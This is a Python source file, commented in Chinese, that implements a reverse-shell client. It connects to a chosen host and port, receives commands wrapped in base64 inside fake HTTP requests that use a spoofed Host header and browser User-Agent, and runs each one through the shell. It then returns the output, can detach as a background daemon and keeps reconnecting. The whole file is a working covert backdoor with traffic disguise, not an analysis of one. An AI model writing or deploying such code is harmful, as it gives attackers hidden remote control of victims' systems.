# -*- coding: utf-8 -*-
import argparse
import atexit
import base64
import os
import socket
import subprocess
import sys
import time


# 进行连接
def connection(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        print("已连接。。。。")
        while True:
            data = s.recv(4096)
            try:
                data = decryption_res(data).decode()
                if data == '\\!shutdown':
                    print('接收到终止进程的指令')
                    sys.exit(0)
                comRst = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                          stdin=subprocess.PIPE)
                m_stdout, m_stderr = comRst.communicate()
                rst = m_stdout.decode(sys.getfilesystemencoding()).encode()
                s.send(encryption_req(rst))
            except Exception as e:
                s.send(encryption_req(str(e).encode()))

            time.sleep(1)
        s.close()
    except Exception as e:
        print(e)


# 守护进程
def daemonize(pid_file=None, **kwargs):
    pid = os.fork()
    if pid:
        sys.exit(0)
    os.chdir('/')
    os.umask(0)
    os.setsid()

    _pid = os.fork()
    if _pid:
        sys.exit(0)

    sys.stdout.flush()
    sys.stderr.flush()
    with open('/dev/null') as read_null, open('/dev/null', 'w') as write_null:
        os.dup2(read_null.fileno(), sys.stdin.fileno())
        os.dup2(write_null.fileno(), sys.stdout.fileno())
        os.dup2(write_null.fileno(), sys.stderr.fileno())
    if pid_file:
        with open(pid_file, 'w+') as f:
            f.write(str(os.getpid()))
    atexit.register(os.remove, pid_file)

    connection(kwargs.get('host'), kwargs.get('port'))


# 加密
def encryption_req(data):
    # 可以采用任何加密或编码方式
    data = base64.b64encode(data).decode()

    sendData = "POST /pushdata"
    sendData += "\r\n"
    sendData += "HTTP/1.1"
    sendData += "\r\n"
    sendData += "Host: tazxuo.com"
    sendData += "\r\n"
    sendData += "Connection: close"
    sendData += "\r\n"
    sendData += "Upgrade-Insecure-Requests: 1"
    sendData += "\r\n"
    sendData += "User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/32.13 (KHTML, like Gecko) Chrome/59.0.332.13 Safari/452.36"
    sendData += "\r\n"
    sendData += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
    sendData += "\r\n"
    sendData += "Accept-Language: en-US,en;q=0.9"
    sendData += "\r\n"
    sendData += "Accept-Encoding: gzip, deflate"
    sendData += "\r\n"
    sendData += "\r\n"
    sendData += "stri0date=%s" % data
    sendData += "\r\n"
    sendData += "\r\n"
    return sendData.encode()


# 解密
def decryption_res(data):
    data = data.decode()
    data = data[data.find("Connection: keep-alive\r\n\r\n") + 26:]
    data = str(base64.b64decode(data), "utf-8")
    return data.encode()


if __name__ == '__main__':
    # 命令行参数解析对象
    parser = argparse.ArgumentParser()
    parser.add_argument('-host', dest='hostName', help='Host Name')
    parser.add_argument('-port', dest='conPort', help='Host Port')
    parser.add_argument('-always', dest='always', type=int, nargs='?', default=False, help='Set the reconnection interval (s).)')
    parser.add_argument('--daemon', nargs='?', default=False, help='Daemon Start')
    # 解析命令行参数
    args = parser.parse_args()
    host = args.hostName
    port = args.conPort
    always = args.always
    daemon = args.daemon

    if host == None or port == None:
        print('Required parameters: -host, -port.')
        print('必须参数：-host、-port。')
        print(parser.parse_args(['-h']))
        exit(0)

    # 定义连接次数
    global conntimes
    conntimes = 0

    while True:
        conntimes += 1
        if daemon != False:
            # 守护进程启动
            import platform
            import re

            if re.search('Windows', platform.system(), re.IGNORECASE):
                if conntimes == 1:
                    print('Windows system does not support daemon startup for the time being, and has switched to non-daemon mode.')
                    print('Windows系统暂不支持守护进程启动，已切换为非守护进程方式。')
                connection(host, port)
            else:
                daemonize(host=host, port=port)
        else:
            connection(host, port)

        if always != False and always > 0:
            if always is None:
                always = 10
            print("%d秒后尝试重新连接(%d)..." % (always, conntimes))
            time.sleep(always)
        else:
            break